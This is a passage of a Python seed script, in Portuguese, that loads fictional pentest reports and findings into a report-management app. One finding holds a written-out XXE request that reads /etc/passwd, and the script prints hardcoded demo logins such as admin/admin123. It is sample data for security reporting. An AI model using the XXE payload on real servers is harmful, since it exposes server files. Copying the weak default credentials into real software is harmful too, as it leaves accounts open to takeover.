      'Content-Security-Policy: default-src \'self\'\n'
      'Referrer-Policy: strict-origin-when-cross-origin'
    ),
    references='https://owasp.org/www-project-secure-headers/\nhttps://securityheaders.com',
    status='Open',
  ),

  'xxe': dict(
    title='XML External Entity (XXE) Injection na importação de XML',
    cwe_key='CWE-611',
    severity='High', cvss_score=7.5,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N',
    cve_id=None,
    affected_component='POST /api/v1/import/xml',
    description=(
      'O endpoint de importação de XML processa entidades externas sem '
      'desabilitá-las, permitindo que um atacante leia arquivos do servidor '
      'ou realize ataques SSRF através de entidades XML maliciosas.'
    ),
    proof_of_concept=(
      '# Payload XXE para leitura de arquivo:\n'
      'POST /api/v1/import/xml HTTP/1.1\n'
      'Content-Type: application/xml\n\n'
      '<?xml version="1.0" encoding="UTF-8"?>\n'
      '<!DOCTYPE foo [\n'
      '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
      ']>\n'
      '<import><data>&xxe;</data></import>\n\n'
      '# Resposta:\n'
      '{"imported": "root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1..."}'
    ),
    impact=(
      '• Leitura de arquivos arbitrários do servidor\n'
      '• SSRF através de entidades externas com URLs HTTP\n'
      '• Possível DoS via "Billion Laughs" attack\n'
      '• Descoberta de arquivos de configuração sensíveis'
    ),
    recommendation=(
      '1. Desabilitar processamento de entidades externas no parser XML\n'
      '2. Python (lxml): parser = etree.XMLParser(resolve_entities=False)\n'
      '3. Validar e sanitizar todos os documentos XML recebidos\n'
      '4. Considerar migrar para JSON onde possível'
    ),
    references='https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\nhttps://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html',
    status='Open',
  ),
}

# ─── Report definitions ─────────────────────────────────────────────────────
REPORTS = [
  dict(
    title='Pentest Web Application — Portal de Internet Banking',
    product_idx=0, author_idx=1,
    report_type='Web Application',
    status='Final',
    start_date=d(2025,10,7), end_date=d(2025,10,18),
    version='2.0',
    executive_summary=(
      'A avaliação de segurança do Portal de Internet Banking do Banco NovoBrasil '
      'identificou 6 vulnerabilidades, sendo 2 de severidade Crítica, 2 Alta e '
      '2 de severidade menor. As vulnerabilidades críticas permitem comprometimento '
      'total da plataforma e devem ser remediadas com prioridade máxima.\n\n'
      'O risco mais severo é a presença de SQL Injection no endpoint de autenticação, '
      'que permite bypass completo do login e acesso aos dados de todos os correntistas. '
      'Adicionalmente, a ausência de rate limiting facilita ataques de força bruta.\n\n'
      'Recomenda-se plano de remediação imediato para as vulnerabilidades críticas '
      'antes de qualquer nova release para produção.'
    ),
    methodology=(
      'O teste foi conduzido seguindo a metodologia OWASP Testing Guide v4.2 e PTES '
      '(Penetration Testing Execution Standard), nas seguintes fases:\n\n'
      '1. Reconhecimento e coleta de informações\n'
      '2. Mapeamento da aplicação e análise de superfície de ataque\n'
      '3. Teste de autenticação e gerenciamento de sessão\n'
      '4. Teste de autorização e controle de acesso\n'
      '5. Teste de validação de entrada (Injection, XSS, etc.)\n'
      '6. Análise de configuração e criptografia\n'
      '7. Testes de lógica de negócios'
    ),
    scope=(
      '• https://internetbanking.novobrasil.com.br (produção — modo leitura)\n'
      '• https://hml-internetbanking.novobrasil.com.br (homologação — testes completos)\n'
      '• API Gateway: https://api.novobrasil.com.br/v1\n'
      '• Mobile backend (iOS/Android)\n\n'
      'FORA DO ESCOPO:\n'
      '• Infraestrutura de rede e datacenter\n'
      '• Sistemas de terceiros integrados (BACEN, CIP)\n'
      '• Ataques de Engenharia Social'
    ),
    conclusion=(
      'O Portal de Internet Banking apresenta postura de segurança inadequada para '
      'uma instituição financeira. As vulnerabilidades críticas identificadas representam '
      'risco imediato aos dados e recursos dos correntistas.\n\n'
      'É imprescindível a remediação das vulnerabilidades críticas antes da próxima '
      'janela de manutenção. Um reteste deve ser agendado para validação das correções.\n\n'
      'A adoção de um programa de desenvolvimento seguro (SSDLC) e revisões periódicas '
      'de segurança são fortemente recomendadas.'
    ),
    vulns=['sqli', 'xss_stored', 'jwt_weak', 'broken_auth', 'info_disclosure', 'missing_headers'],
    vuln_statuses=['Open','Open','Open','Open','Open','Open'],
    created_days_ago=30,
  ),

  dict(
    title='Pentest de Infraestrutura e Rede Interna',
    product_idx=2, author_idx=2,
    report_type='Network',
    status='Final',
    start_date=d(2025,11,3), end_date=d(2025,11,14),
    version='1.0',
    executive_summary=(
      'O teste de penetração na infraestrutura de rede da LogiTech Transportes '
      'revelou falhas graves de segurança que permitem acesso não autorizado '
      'a serviços críticos internos e equipamentos de rede.\n\n'
      'O achado mais crítico é a presença de credenciais padrão no switch de núcleo '
      'da rede, permitindo controle total da infraestrutura por um atacante não '
      'autenticado. Adicionalmente, bancos de dados estão expostos diretamente '
      'à internet sem proteção de firewall.'
    ),
    methodology=(
      'Metodologia seguida: PTES + CIS Benchmark para equipamentos de rede.\n\n'
      'Fases:\n'
      '1. Reconhecimento passivo e ativo (OSINT, DNS, Shodan)\n'
      '2. Varredura de portas e identificação de serviços\n'
      '3. Enumeração de vulnerabilidades\n'
      '4. Exploração e pós-exploração\n'
      '5. Análise de segmentação e controles de acesso'
    ),
    scope=(
      'Ranges de IP em escopo:\n'
      '• 10.0.0.0/24 — Rede de infraestrutura\n'
      '• 10.0.1.0/24 — Servidores de aplicação\n'
      '• 10.0.2.0/24 — Banco de dados\n'
      '• IPs externos: 200.100.50.0/28\n\n'
      'Equipamentos específicos:\n'
      '• 3x switches Cisco Catalyst\n'
      '• 2x firewalls Fortinet\n'
      '• Servidores de banco de dados (MySQL, PostgreSQL, Redis)'
    ),
    conclusion=(
      'A infraestrutura da LogiTech apresenta múltiplos pontos de falha críticos. '
      'A combinação de equipamentos de rede com credenciais padrão, serviços de '
      'banco de dados expostos e protocolos legados representa risco elevado.\n\n'
      'Prioridade imediata: alterar credenciais do switch de núcleo e fechar '
      'as portas de banco de dados para a internet.'
    ),
    vulns=['open_ports', 'default_creds', 'snmp_v1', 'tls_weak'],
    vuln_statuses=['Open','Open','Accepted Risk','Remediated'],
    created_days_ago=20,
  ),

  dict(
    title='Red Team Assessment — Simulação de APT',
    product_idx=3, author_idx=1,
    report_type='Red Team',
    status='In Review',
    start_date=d(2025,12,1), end_date=d(2025,12,19),
    version='1.0',
    executive_summary=(
      'O exercício de Red Team simulando um ator de ameaça persistente avançada (APT) '
      'contra a Secretaria de Finanças demonstrou que um atacante determinado seria '
      'capaz de comprometer sistemas críticos de arrecadação em aproximadamente 4 dias.\n\n'
      'A cadeia de ataque explorada incluiu: SSRF → acesso a metadados de instância '
      'cloud → credenciais AWS → acesso ao S3 com dados de contribuintes → '
      'movimentação lateral para sistemas de produção.'
    ),
    methodology=(
      'Exercício conduzido sob as premissas de Red Team TIBER-BR e MITRE ATT&CK.\n\n'
      'Regras de engajamento:\n'
      '• Sem DoS ou impacto em produção\n'
      '• Time box: 15 dias úteis\n'
      '• Notificação ao Blue Team apenas após conclusão\n\n'
      'Fases ATT&CK cobbertas: Reconnaissance, Resource Development, Initial Access, '
      'Execution, Persistence, Privilege Escalation, Defense Evasion, Lateral Movement, '
      'Collection, Exfiltration'
    ),
    scope=(
      '• Todos os sistemas públicos da Secretaria de Finanças\n'
      '• Ambiente AWS (conta de produção)\n'
      '• Rede interna (via acesso inicial)\n'
      '• Usuários: campanhas de phishing (com aprovação prévia)\n\n'
      'Objetivos (flags):\n'
      '• Flag 1: Acesso à base de declarações do IRPF ✓ COMPROMETIDA\n'
      '• Flag 2: Acesso ao sistema de pagamentos ✓ COMPROMETIDA\n'
      '• Flag 3: Acesso ao diretório de autoridades ✗ NÃO COMPROMETIDA'
    ),
    conclusion=(
      'O exercício demonstrou lacunas significativas nas capacidades defensivas, '
      'especialmente na detecção de movimentação lateral. O Blue Team detectou '
      'a atividade apenas no 11º dia de operação.\n\n'
      'Recomenda-se investimento em SIEM, EDR e programa de threat hunting.'
    ),
    vulns=['ssrf', 'exposed_admin', 'log4shell', 'path_traversal'],
    vuln_statuses=['Open','Open','Remediated','Open'],
    created_days_ago=10,
  ),

  dict(
    title='Avaliação de Segurança — API REST E-commerce',
    product_idx=4, author_idx=3,
    report_type='API',
    status='Draft',
    start_date=d(2026,1,13), end_date=d(2026,1,24),
    version='0.1',
    executive_summary=(
      'Avaliação em andamento da API REST do ShopMax. Até o momento foram '
      'identificadas vulnerabilidades de IDOR, XXE e exposição de dados sensíveis. '
      'O relatório está em fase de rascunho aguardando conclusão dos testes.'
    ),
    methodology='OWASP API Security Top 10 — teste em ambiente de staging.',
    scope='https://api.shopmax.com.br/v2 (staging)\n• Endpoints: /products, /orders, /users, /payments',
    conclusion='Em elaboração.',
    vulns=['idor', 'xxe', 'info_disclosure'],
    vuln_statuses=['Open','Open','Open'],
    created_days_ago=3,
  ),

  dict(
    title='Pentest Web Application — Sistema de Prontuário Eletrônico',
    product_idx=1, author_idx=2,
    report_type='Web Application',
    status='Final',
    start_date=d(2025,9,8), end_date=d(2025,9,19),
    version='1.1',
    executive_summary=(
      'Avaliação de segurança do Sistema de Prontuário Eletrônico da HealthPlus. '
      'Foram identificadas 3 vulnerabilidades, nenhuma de nível crítico. '
      'A postura de segurança é razoável com necessidade de melhorias pontuais.'
    ),
    methodology='OWASP Testing Guide v4.2 com foco em conformidade LGPD e CFM 1821/2007.',
    scope='https://pep.healthplus.com.br\nAPI: https://api.healthplus.com.br/v3',
    conclusion=(
      'O sistema apresenta postura de segurança satisfatória. As vulnerabilidades '
      'encontradas têm mitigação direta e devem ser remediadas no próximo sprint.'
    ),
    vulns=['xss_stored', 'missing_headers', 'tls_weak'],
    vuln_statuses=['Remediated','Open','Remediated'],
    created_days_ago=60,
  ),
]


# ═══════════════════════════════════════════════════════════════════════════
#  SEED
# ═══════════════════════════════════════════════════════════════════════════
def seed():
    with app.app_context():
        print('\n🌱  Iniciando seed do banco de dados...\n')

        # ── Users ──────────────────────────────────────────────────────────
        print('  👤  Criando usuários...')
        user_objs = []
        for u in USERS:
            existing = User.query.filter_by(username=u['username']).first()
            if existing:
                user_objs.append(existing)
                print(f'      → {u["username"]} já existe, pulando')
                continue
            obj = User(
                username=u['username'],
                email=u['email'],
                full_name=u['full_name'],
                role=u['role'],
                created_at=ago(90),
                last_login=ago(random.randint(0, 5)),
            )
            obj.set_password(u['password'])
            db.session.add(obj)
            user_objs.append(obj)
            print(f'      + {u["username"]} ({u["role"]})')
        db.session.flush()

        # ── CWEs ───────────────────────────────────────────────────────────
        print('\n  🏷️  Criando CWEs...')
        cwe_objs = {}
        for cw in CWES_SEED:
            existing = CWE.query.filter_by(cwe_id=cw['cwe_id']).first()
            if existing:
                cwe_objs[cw['cwe_id']] = existing
                print(f'      → {cw["cwe_id"]} já existe, pulando')
                continue
            obj = CWE(**cw)
            db.session.add(obj)
            cwe_objs[cw['cwe_id']] = obj
            print(f'      + {cw["cwe_id"]} — {cw["name"]}')
        db.session.flush()

        # ── Products ───────────────────────────────────────────────────────
        print('\n  📦  Criando produtos...')
        product_objs = []
        for c in PRODUCTS:
            existing = Product.query.filter_by(name=c['name']).first()
            if existing:
                product_objs.append(existing)
                print(f'      → {c["name"]} já existe, pulando')
                continue
            obj = Product(**c, created_at=ago(random.randint(60, 180)))
            db.session.add(obj)
            product_objs.append(obj)
            print(f'      + {c["name"]}')
        db.session.flush()

        # ── Reports + Vulnerabilities ──────────────────────────────────────
        print('\n  📄  Criando relatórios e vulnerabilidades...')
        for rd in REPORTS:
            existing = Report.query.filter_by(title=rd['title']).first()
            if existing:
                print(f'      → "{rd["title"][:55]}..." já existe, pulando')
                continue

            report = Report(
                title=rd['title'],
                product_id=product_objs[rd['product_idx']].id,
                author_id=user_objs[rd['author_idx']].id,
                report_type=rd['report_type'],
                status=rd['status'],
                start_date=rd['start_date'],
                end_date=rd['end_date'],
                version=rd['version'],
                executive_summary=rd['executive_summary'],
                methodology=rd['methodology'],
                scope=rd['scope'],
                conclusion=rd['conclusion'],
                created_at=ago(rd['created_days_ago']),
                updated_at=ago(max(0, rd['created_days_ago'] - random.randint(1,5))),
            )
            db.session.add(report)
            db.session.flush()

            print(f'\n      📋 [{rd["status"]}] {rd["title"][:60]}...')

            for i, (vkey, vstatus) in enumerate(zip(rd['vulns'], rd['vuln_statuses'])):
                vd = dict(VULNS[vkey])
                sev = vd.pop('severity')
                cwe_key = vd.pop('cwe_key', None)
                status_override = vstatus

                cwe_obj = cwe_objs.get(cwe_key) if cwe_key else None

                vuln = Vulnerability(
                    report_id=report.id,
                    cwe_id=cwe_obj.id if cwe_obj else None,
                    title=vd['title'],
                    description=vd['description'],
                    cvss_score=vd.get('cvss_score'),
                    cvss_vector=vd.get('cvss_vector'),
                    cve_id=vd.get('cve_id'),
                    affected_component=vd.get('affected_component'),
                    proof_of_concept=vd.get('proof_of_concept'),
                    impact=vd.get('impact'),
                    recommendation=vd.get('recommendation'),
                    references=vd.get('references'),
                    status=status_override,
                    order_index=i,
                    created_at=ago(rd['created_days_ago'] - 1),
                    updated_at=ago(max(0, rd['created_days_ago'] - 3)),
                )
                vuln.set_severity(sev)
                db.session.add(vuln)
                sev_icon = {'Critical':'🔴','High':'🟠','Medium':'🟡','Low':'🔵','Informational':'⚪'}.get(sev,'•')
                print(f'         {sev_icon} [{sev:13s}] {vd["title"][:55]}')

            db.session.flush()
            report.overall_risk = report.get_overall_risk()

        db.session.commit()

        # ── Summary ────────────────────────────────────────────────────────
        print('\n' + '─'*60)
        print(f'  ✅  Seed concluído!\n')
        print(f'  👤  Usuários:         {User.query.count()}')
        print(f'  📦  Produtos:         {Product.query.count()}')
        print(f'  🏷️  CWEs:             {CWE.query.count()}')
        print(f'  📄  Relatórios:       {Report.query.count()}')
        print(f'  🐛  Vulnerabilidades: {Vulnerability.query.count()}')
        print()
        print('  🔐  Credenciais de acesso:')
        print('      admin   / admin123')
        print('      carlos  / pentest123')
        print('      ana     / pentest123')
        print('      rafael  / pentest123')
        print()
        print('  🌐  Acesse: http://localhost:5000')
        print('─'*60 + '\n')


if __name__ == '__main__':
    seed()
